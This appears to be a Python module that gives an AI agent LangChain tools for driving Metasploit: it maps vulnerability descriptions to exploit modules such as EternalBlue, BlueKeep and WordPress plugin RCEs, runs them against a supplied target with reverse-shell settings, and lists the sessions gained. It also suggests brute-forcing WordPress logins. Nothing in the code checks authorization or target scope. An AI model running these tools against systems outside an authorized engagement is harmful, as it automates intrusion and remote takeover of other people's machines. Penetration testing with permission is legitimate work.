import os
import sys
import time
import json
from typing import Dict, Any, List, Optional
from langchain_core.tools import tool
from pymetasploit3.msfrpc import MsfRpcClient
from colorama import Fore, Style

# Add logging
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from utils.metasploit_logger import log_activity
except ImportError:
    # Fallback if logger not available
    def log_activity(activity_type: str, details: dict):
        pass

# Global client instance (lazy initialization)
_msf_client = None


def get_msf_client() -> MsfRpcClient:
    """Get or create Metasploit RPC client with lazy initialization"""
    global _msf_client

    if _msf_client is None:
        # Get connection parameters from environment
        password = os.getenv("MSF_PASSWORD", "msf")
        server = os.getenv("MSF_SERVER", "127.0.0.1")
        port = int(os.getenv("MSF_PORT", "55553"))
        ssl = os.getenv("MSF_SSL", "true").lower() == "true"

        try:
            _msf_client = MsfRpcClient(password, server=server, port=port, ssl=ssl)
            print(f"{Fore.GREEN}[+] Connected to Metasploit RPC service{Style.RESET_ALL}")
        except Exception as e:
            raise ConnectionError(f"Failed to connect to Metasploit RPC: {str(e)}")

    return _msf_client


def validate_metasploit_connection() -> bool:
    """Validate that Metasploit RPC service is accessible"""
    try:
        client = get_msf_client()
        # Test connection by getting version
        version = client.core.version
        print(f"{Fore.GREEN}✓ Metasploit RPC connected (v{version['version']}){Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}✗ Metasploit RPC not available: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Start with: msfrpcd -P <password> -p 55553{Style.RESET_ALL}")
        return False


@tool
def search_and_select_exploit(vulnerability_info: str) -> str:
    """
    Search for and select the best exploit based on vulnerability information.
    
    IMPORTANT: Metasploit primarily contains exploits for:
    - Remote Code Execution (RCE) vulnerabilities
    - Authentication bypasses
    - Known CVEs with public exploits
    - Specific vulnerable plugins/software versions
    
    NOT included in Metasploit:
    - CSRF vulnerabilities (require manual exploitation)
    - XSS vulnerabilities (require manual testing)
    - Information disclosure (usually not exploitable)
    - Generic misconfigurations

    Args:
        vulnerability_info: Description of vulnerabilities found (e.g., "WordPress 5.3, Social Warfare 3.5.2 RCE", "MS17-010 EternalBlue", etc.)

    Returns:
        Selected exploit module and configuration details, or explanation if no exploit exists
    """
    # Log tool invocation
    log_activity("tool_call", {
        "tool_name": "search_and_select_exploit",
        "args": {"vulnerability_info": vulnerability_info}
    })
    
    try:
        client = get_msf_client()
        
        log_activity("rpc_call", {
            "method": "modules.exploits",
            "params": {"search_query": vulnerability_info}
        })

        print(f"{Fore.CYAN}[DEBUG] Searching exploits for vulnerability: {vulnerability_info}{Style.RESET_ALL}")

        vuln_lower = vulnerability_info.lower()
        
        # ===== STEP 1: Check for non-exploitable vulnerabilities =====
        non_exploitable_keywords = [
            "csrf", "cross-site request forgery", "xss", "cross-site scripting",
            "information disclosure", "outdated", "version detected", "enumeration",
            "directory listing", "none", "unknown version"
        ]
        
        if any(keyword in vuln_lower for keyword in non_exploitable_keywords):
            print(f"{Fore.YELLOW}[DEBUG] Detected non-exploitable vulnerability type{Style.RESET_ALL}")
            
            log_activity("search", {
                "query": vulnerability_info,
                "results_count": 0,
                "reason": "non-exploitable"
            })
            
            return (
                f"❌ NO METASPLOIT EXPLOIT AVAILABLE\n\n"
                f"Vulnerability Type: {vulnerability_info}\n\n"
                f"Reason: Metasploit does not contain exploits for:\n"
                f"  • CSRF (Cross-Site Request Forgery) - requires manual HTML/JavaScript exploitation\n"
                f"  • XSS (Cross-Site Scripting) - requires manual testing\n"
                f"  • Information disclosure - not directly exploitable\n"
                f"  • Generic version enumeration - need specific CVE or vulnerability\n\n"
                f"Recommended Actions:\n"
                f"  1. Use WPScan to find specific vulnerable plugins with CVEs\n"
                f"  2. Check for default credentials (WordPress admin panel)\n"
                f"  3. Look for known CVEs for the detected versions\n"
                f"  4. Use auxiliary modules for brute force attacks\n\n"
                f"Alternative Metasploit Modules:\n"
                f"  • auxiliary/scanner/http/wordpress_login_enum - Enumerate WordPress users\n"
                f"  • auxiliary/scanner/http/wordpress_xmlrpc_login - Brute force via XML-RPC\n"
                f"  • exploit/unix/webapp/wp_admin_shell_upload - If you have admin credentials\n"
            )

        # ===== STEP 2: Map common vulnerabilities to specific exploits =====
        vulnerability_map = {
            # Windows Exploits
            "ms17-010": "exploit/windows/smb/ms17_010_eternalblue",
            "eternalblue": "exploit/windows/smb/ms17_010_eternalblue",
            "ms08-067": "exploit/windows/smb/ms08_067_netapi",
            "bluekeep": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            
            # WordPress Plugin Exploits (RCE)
            "social warfare": "exploit/unix/webapp/wp_social_warfare_rce",
            "social_warfare": "exploit/unix/webapp/wp_social_warfare_rce",
            "wp file manager": "exploit/unix/webapp/wp_file_manager_rce",
            "duplicator": "exploit/unix/webapp/wp_duplicator_rce",
            "total cache": "exploit/unix/webapp/wp_total_cache_exec",
            "ninja forms": "exploit/unix/webapp/wp_ninja_forms_unauthenticated_file_upload",
            
            # WordPress Core (with admin access)
            "wordpress admin": "exploit/unix/webapp/wp_admin_shell_upload",
            "wp admin": "exploit/unix/webapp/wp_admin_shell_upload",
            
            # Web Applications
            "apache struts": "exploit/multi/http/struts2_content_type_ognl",
            "drupalgeddon": "exploit/unix/webapp/drupal_drupalgeddon2",
            "tomcat manager": "exploit/multi/http/tomcat_mgr_deploy",
            "jenkins script": "exploit/multi/http/jenkins_script_console",
            
            # Services
            "heartbleed": "auxiliary/scanner/ssl/openssl_heartbleed",
            "shellshock": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        }

        selected_exploit = None

        # Check for known vulnerability mappings
        for vuln_key, exploit_path in vulnerability_map.items():
            if vuln_key in vuln_lower:
                selected_exploit = exploit_path
                print(f"{Fore.GREEN}[DEBUG] Matched known vulnerability: {vuln_key} -> {exploit_path}{Style.RESET_ALL}")
                break

        # ===== STEP 3: If no direct match, search Metasploit modules =====
        if not selected_exploit:
            print(f"{Fore.YELLOW}[DEBUG] No direct match, searching Metasploit database...{Style.RESET_ALL}")
            
            # Extract search keywords
            search_terms = []
            
            # WordPress-specific searches
            if "wordpress" in vuln_lower or "wp-" in vuln_lower:
                search_terms.append("wordpress")
                # Try to extract plugin names
                if "plugin" in vuln_lower:
                    # Extract plugin name if present
                    import re
                    plugin_match = re.search(r'(wp[-_]\w+)', vuln_lower)
                    if plugin_match:
                        search_terms.append(plugin_match.group(1))
            
            # Other application searches
            if "apache" in vuln_lower and "struts" not in vuln_lower:
                search_terms.append("apache")
            if "windows" in vuln_lower or "smb" in vuln_lower:
                search_terms.append("smb")
            if "drupal" in vuln_lower:
                search_terms.append("drupal")
            if "joomla" in vuln_lower:
                search_terms.append("joomla")

            # Search for exploits in Metasploit database
            all_exploits = client.modules.exploits
            matching = []

            for term in search_terms:
                term_matches = [e for e in all_exploits if term in e.lower()]
                matching.extend(term_matches)
                if term_matches:
                    print(f"{Fore.CYAN}[DEBUG] Found {len(term_matches)} exploits matching '{term}'{Style.RESET_ALL}")

            if matching:
                # Remove duplicates and prioritize by relevance
                matching = list(set(matching))
                
                # Prioritize exploit modules over auxiliary
                exploit_modules = [m for m in matching if m.startswith('exploit/')]
                if exploit_modules:
                    matching = exploit_modules
                
                # Show top 5 matches
                print(f"{Fore.GREEN}[DEBUG] Found {len(matching)} potential exploit(s){Style.RESET_ALL}")
                for i, exp in enumerate(matching[:5], 1):
                    print(f"{Fore.CYAN}    {i}. {exp}{Style.RESET_ALL}")
                
                selected_exploit = matching[0]
                print(f"{Fore.YELLOW}[DEBUG] Selected: {selected_exploit}{Style.RESET_ALL}")
                
                log_activity("search", {
                    "query": vulnerability_info,
                    "results_count": len(matching),
                    "selected": selected_exploit
                })

        # ===== STEP 4: Return exploit details or helpful message =====
        if selected_exploit:
            # Simply return the exploit path without trying to get detailed info
            # The pymetasploit3 API for getting module details is unreliable
            result = f"✅ EXPLOIT FOUND\n\n"
            result += f"Selected Exploit: {selected_exploit}\n"
            
            result += f"\nRequired options:\n"
            result += f"  RHOSTS: [target IP/domain]\n"
            
            if 'reverse' in selected_exploit.lower():
                result += f"  LHOST: [your IP for reverse connection]\n"
                result += f"  LPORT: 4444 [your listening port]\n"
            
            # Add WordPress-specific options
            if 'wordpress' in selected_exploit.lower() or 'wp_' in selected_exploit.lower():
                result += f"\nWordPress-specific options (if required):\n"
                result += f"  USERNAME: [WordPress admin username]\n"
                result += f"  PASSWORD: [WordPress admin password]\n"
                result += f"  TARGETURI: / [WordPress installation path]\n"
            
            log_activity("search", {
                "query": vulnerability_info,
                "results_count": 1,
                "selected": selected_exploit
            })
            
            return result
        else:
            return (
                f"❌ NO SUITABLE EXPLOIT FOUND\n\n"
                f"Searched for: {vulnerability_info}\n\n"
                f"Possible reasons:\n"
                f"  • Vulnerability is not exploitable via Metasploit\n"
                f"  • Need more specific information (plugin name, CVE number)\n"
                f"  • Vulnerability requires manual exploitation\n\n"
                f"Recommended next steps:\n"
                f"  1. Use WPScan with --api-token to get CVE information\n"
                f"  2. Search Exploit-DB: https://www.exploit-db.com/\n"
                f"  3. Check for default credentials\n"
                f"  4. Use auxiliary/scanner/http/wordpress_login_enum for user enumeration\n"
                f"  5. Try brute force with auxiliary/scanner/http/wordpress_xmlrpc_login\n"
            )

    except Exception as e:
        return f"❌ Error searching exploits: {str(e)}\n\nMake sure msfrpcd is running: msfrpcd -P msf -p 55553"


# Removed list_payloads - not needed for MVP


@tool
def execute_exploit(exploit_module: str, rhosts: str, lhost: str = None, lport: str = "4444") -> str:
    """
    Execute a Metasploit exploit module against a target (MVP version)

    Args:
        exploit_module: Full exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
        rhosts: Target host(s) IP address
        lhost: Local host for reverse connections (auto-detected if not provided)
        lport: Local port for reverse connections (default: 4444)

    Returns:
        Execution result and session information
    """
    # Log tool invocation
    log_activity("tool_call", {
        "tool_name": "execute_exploit",
        "args": {
            "exploit_module": exploit_module,
            "rhosts": rhosts,
            "lhost": lhost,
            "lport": lport
        }
    })
    
    try:
        client = get_msf_client()

        print(f"{Fore.RED}[DEBUG] EXECUTING EXPLOIT: {exploit_module}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Target: {rhosts}{Style.RESET_ALL}")
        
        log_activity("execute", {
            "module": exploit_module,
            "target": rhosts,
            "lhost": lhost,
            "lport": lport
        })

        # Create a console for execution
        console = client.consoles.console()
        console_id = console.cid

        # Use the exploit module
        cmd = f"use {exploit_module}"
        console.write(cmd)
        time.sleep(1)

        # Set RHOSTS
        cmd = f"set RHOSTS {rhosts}"
        console.write(cmd)
        time.sleep(0.5)

        # Auto-detect LHOST if not provided
        if not lhost:
            import socket
            try:
                # Get local IP address
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                lhost = s.getsockname()[0]
                s.close()
            except:
                lhost = "127.0.0.1"
            print(f"{Fore.YELLOW}[DEBUG] Auto-detected LHOST: {lhost}{Style.RESET_ALL}")

        # Set LHOST if needed (for reverse connections)
        if 'reverse' in exploit_module.lower() or 'bind' not in exploit_module.lower():
            cmd = f"set LHOST {lhost}"
            console.write(cmd)
            time.sleep(0.5)

            # Set LPORT
            cmd = f"set LPORT {lport}"
            console.write(cmd)
            time.sleep(0.5)

        # Check exploit configuration
        console.write("options")
        time.sleep(1)

        # Execute the exploit
        print(f"{Fore.RED}[!] Launching exploit...{Style.RESET_ALL}")
        console.write("exploit -j")

        # Wait for execution and collect output
        time.sleep(8)  # Increased wait time for execution
        output = console.read()

        # Check for new sessions
        sessions = client.sessions.list
        session_info = ""
        
        if sessions:
            session_info = f"\n\n{Fore.GREEN}[+] EXPLOITATION SUCCESSFUL - Active sessions:{Style.RESET_ALL}\n"
            for sid, sinfo in sessions.items():
                session_info += f"  Session {sid}: {sinfo.get('type', 'unknown')} @ {sinfo.get('target_host', 'unknown')}\n"
        else:
            # No sessions created - exploitation failed
            session_info = f"\n\n{Fore.YELLOW}[!] EXPLOITATION FAILED - No sessions created{Style.RESET_ALL}\n"
            session_info += f"{Fore.YELLOW}The exploit may not be applicable to this target or the target is not vulnerable.{Style.RESET_ALL}\n"

        # Clean up console
        console.destroy()

        result_output = f"Exploit execution result:\n{output['data']}{session_info}"
        
        # Log the result
        log_activity("exploit_result", {
            "success": len(sessions) > 0,
            "sessions_created": len(sessions)
        })
        
        return result_output

    except Exception as e:
        return f"Error executing exploit: {str(e)}"


# Removed run_auxiliary - not needed for MVP


@tool
def check_sessions() -> str:
    """
    Check for active Metasploit sessions after exploitation

    Returns:
        List of active sessions and their details
    """
    # Log tool invocation
    log_activity("tool_call", {
        "tool_name": "check_sessions",
        "args": {}
    })
    
    try:
        client = get_msf_client()

        print(f"{Fore.CYAN}[DEBUG] Checking for active sessions{Style.RESET_ALL}")
        sessions = client.sessions.list
        
        log_activity("check_sessions", {
            "session_count": len(sessions)
        })

        if not sessions:
            return "No active sessions - exploitation may have failed"

        result = f"{Fore.GREEN}EXPLOITATION SUCCESSFUL!{Style.RESET_ALL}\n"
        result += "Active sessions:\n\n"
        for sid, sinfo in sessions.items():
            result += f"Session {sid}:\n"
            result += f"  Type: {sinfo.get('type', 'unknown')}\n"
            result += f"  Info: {sinfo.get('info', 'unknown')}\n"
            result += f"  Target: {sinfo.get('target_host', 'unknown')}\n"
            result += f"  Exploit: {sinfo.get('via_exploit', 'unknown')}\n\n"

        return result

    except Exception as e:
        return f"Error checking sessions: {str(e)}"


# Removed generate_payload and run_post_module - not needed for MVP